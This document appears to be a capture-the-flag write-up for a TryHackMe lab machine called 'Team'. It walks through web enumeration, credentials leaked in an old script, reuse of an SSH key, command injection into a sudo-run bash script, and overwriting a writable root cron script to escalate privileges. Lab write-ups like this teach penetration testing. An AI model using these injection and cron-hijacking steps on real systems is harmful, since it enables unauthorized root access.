port: 21,22,80 open

Unable to login to ftp with: `anonymous` username

Went to port 80 webserver where apache2 was running, I noticed in source page, it is written that we have to add _hostname-ip_ to /etc/hosts, to work properly => `virtual hosts`.

Then visited team.thm => used gobuster.

Got this:
```
/images               (Status: 301) [Size: 305] [--> http://team.thm/images/]
/assets               (Status: 301) [Size: 305] [--> http://team.thm/assets/]
/scripts              (Status: 301) [Size: 306] [--> http://team.thm/scripts/]
/index.html           (Status: 200) [Size: 2966]                              
/robots.txt 
```
In robots.txt, I got the name of the user: dale

In /scripts/ `=> I got script.txt (bash script) -> which tells us that this file is new, and does not have any creds`
It tells:
```
# Updated version of the script
# Note to self had to change the extension of the old "script" in this folder, as it has creds in
```
Then I downloaded: `script.old` which has the creds for ***`ftp login`***.

In ftp server, I found another file named: `New_site.txt`
where, it was written:
```
It can be
found at ".dev" within our domain.

Also as per the team policy please make a copy of your "id_rsa" and place this in the relevent config file.
```

So, we can find the `id_rsa` priv key for `Dale`

We logged in as dale and got the user.flag

Now for:
* `sudo -l`

We can see the file: `/home/gyles/admin_checks`

Seeing the script named: `admin_checks`
We can see the output generated by it except error (`$error 2>/dev/null`)
```
#!/bin/bash

printf "Reading stats.\n"
sleep 1
printf "Reading stats..\n"
sleep 1
read -p "Enter name of person backing up the data: " name
echo $name  >> /var/stats/stats.txt
read -p "Enter 'date' to timestamp the file: " error
printf "The Date is "
$error 2>/dev/null

date_save=$(date "+%F-%H-%M")
cp /var/stats/stats.txt /var/stats/stats-$date_save.bak

printf "Stats have been backed up\n"
```
We can also see present user: `dale` has `sudo permission` and the executable file can be run by `gyles` user

```
$ ls -la /home/gyles/admin_checks
-rwxr--r-- 1 gyles editors 399 Jan 15 21:52 /home/gyles/admin_checks
```
```
dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks
Reading stats.
Reading stats..
Enter name of person backing up the data: doesnotdepend
Enter 'date' to timestamp the file: bash
The Date is id
uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin)
```

Then we got a shell, as we can see we are logged in as `gyles` user

We then discovered in /opt directory as bash shell named: `admin_stuff`

Within that:
```
#!/bin/bash
#I have set a cronjob to run this script every minute


dev_site="/usr/local/sbin/dev_backup.sh"
main_site="/usr/local/bin/main_backup.sh"
#Back ups the sites locally
$main_site
$dev_site
```
It runs 2 backups, one for the dev_site and one for the main_site, all thanks to ***`Cron job`***. letâ€™s have a look at those:
```
ls -l /usr/local/sbin/dev_backup.sh
-rwxr-xr-x 1 root root 64 Jan 17 19:42 /usr/local/sbin/dev_backup.sh
ls -l /usr/local/bin/main_backup.sh
-rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh
```

We can see that `/usr/local/bin/main_backup.sh` can be modified by anyone oin the admin group and gues what!!***`gyles`*** user is in _admin_ group


Now, what we can do is:

1. Update the script with bash revshell to get a root shell
2. Though this will not be successful. Why? Well, let me explain...
We can simple place
```
echo "cat root.txt > /home/dale/flag.txt" > /usr/local/bin/main_backup.sh
```
to get the result in /home/dale/flag.txt file, considering `root.txt is present in /root directory`. But in case, `root.txt` not present in /root directory, it would not work at first.


